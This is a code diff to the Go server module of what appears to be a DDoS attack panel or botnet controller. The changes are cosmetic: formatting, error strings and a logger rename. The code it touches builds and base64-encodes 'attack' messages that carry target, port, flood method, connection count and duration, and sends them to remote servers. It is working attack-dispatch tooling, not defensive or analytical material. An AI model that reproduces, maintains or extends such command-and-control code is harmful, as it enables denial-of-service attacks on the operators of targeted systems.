@@ -2,6 +2,7 @@ package servers
 
 import (
 	"api/core/models/floods"
+	"api/core/models/log"
 	"encoding/base64"
 	"encoding/json"
 	"errors"
@@ -23,7 +24,7 @@ type AttackMessage struct {
 		Target   string `json:"target"`
 		Port     string `json:"port"`
 		Method   string `json:"method"`
-		Conns	 string `json:"conns"`
+		Conns    string `json:"conns"`
 		Duration string `json:"duration"`
 	} `json:"data"`
 	Options struct {
@@ -34,9 +35,9 @@ type AttackMessage struct {
 }
 
 type MethodsMessage struct {
-    ID        int      `json:"mmid"`
-    MessageID int      `json:"messageid"`
-    Methods   []string `json:"methods"` // List of methods
+	ID        int      `json:"mmid"`
+	MessageID int      `json:"messageid"`
+	Methods   []string `json:"methods"` // List of methods
 }
 
 const (
@@ -46,12 +47,12 @@ const (
 	MessageAttack       = iota
 	MessagePing         = iota
 	MessageStop         = iota
-	MessageMethods 		= 105
+	MessageMethods      = 105
 )
 
 var (
-	ErrMsgIDMismatch = errors.New("message ID Mismatch!")
-	ErrMsgDecode     = errors.New("failed to decode the message!")
+	ErrMsgIDMismatch = errors.New("message ID Mismatch")
+	ErrMsgDecode     = errors.New("failed to decode the message")
 )
 
 func (s *Server) ReadMessage() (*Message, error) {
@@ -59,41 +60,41 @@ func (s *Server) ReadMessage() (*Message, error) {
 	n, err := s.Read(buf)
 	if err != nil || n < 0 {
 		delete(Servers, s.Name)
-		logger.Println(err)
+		log.Println(err)
 		return nil, err
 	}
 	m := new(Message)
 	decoded := make([]byte, 1024)
 	len, err := base64.RawStdEncoding.Decode(decoded, buf[:n])
 	if err != nil {
-		logger.Println("failed to read message \"" + err.Error() + "\"")
+		log.Println("failed to read message \"" + err.Error() + "\"")
 		return nil, ErrMsgDecode
 	}
 	err = json.Unmarshal(decoded[:len], &m)
 	if err != nil {
-		logger.Println("failed to read message \"" + err.Error() + "\"")
+		log.Println("failed to read message \"" + err.Error() + "\"")
 		return nil, ErrMsgDecode
 	}
 	s.CurrentID++
 	if s.CurrentID != m.MessageID {
-		logger.Println("message id mismatch! (server=" + fmt.Sprint(s.CurrentID) + ", client=" + fmt.Sprint(m.MessageID) + ")")
+		log.Println("message id mismatch! (server=" + fmt.Sprint(s.CurrentID) + ", client=" + fmt.Sprint(m.MessageID) + ")")
 		return nil, ErrMsgIDMismatch
 	}
 	return m, nil
 }
 
 func splitMessages(data []byte) [][]byte {
-    // This is just an example, you might need a more sophisticated method of splitting
-    // if messages are larger, or a different delimiter is used
-    var messages [][]byte
-    start := 0
-    for i := 0; i < len(data); i++ {
-        if data[i] == '}' {  // Assuming that '}' ends a message
-            messages = append(messages, data[start:i+1])
-            start = i + 1
-        }
-    }
-    return messages
+	// This is just an example, you might need a more sophisticated method of splitting
+	// if messages are larger, or a different delimiter is used
+	var messages [][]byte
+	start := 0
+	for i := 0; i < len(data); i++ {
+		if data[i] == '}' { // Assuming that '}' ends a message
+			messages = append(messages, data[start:i+1])
+			start = i + 1
+		}
+	}
+	return messages
 }
 func (s *Server) NewMessage(ID int, Content string) (*Message, []byte) {
 	s.CurrentID++
@@ -105,7 +106,7 @@ func (s *Server) NewMessage(ID int, Content string) (*Message, []byte) {
 	}
 	bytes, err := json.Marshal(m)
 	if err != nil {
-		logger.Println("error while encoding message!")
+		log.Println("error while encoding message!")
 	}
 	msg := base64.RawStdEncoding.EncodeToString(bytes)
 	buffer := make([]byte, 0)
@@ -135,7 +136,7 @@ func (s *Server) NewAttack(atk *floods.Attack) {
 			Target:   atk.Target,
 			Port:     fmt.Sprint(atk.Port),
 			Method:   atk.Sname,
-			Conns:	  fmt.Sprint(atk.Conns),
+			Conns:    fmt.Sprint(atk.Conns),
 			Duration: fmt.Sprint(atk.Duration),
 		},
 		Options: struct {
@@ -150,7 +151,7 @@ func (s *Server) NewAttack(atk *floods.Attack) {
 	}
 	bytes, err := json.Marshal(attack)
 	if err != nil {
-		logger.Println("error while encoding message!")
+		log.Println("error while encoding message!")
 	}
 	msg := base64.RawStdEncoding.EncodeToString(bytes)
 	buffer := make([]byte, 0)
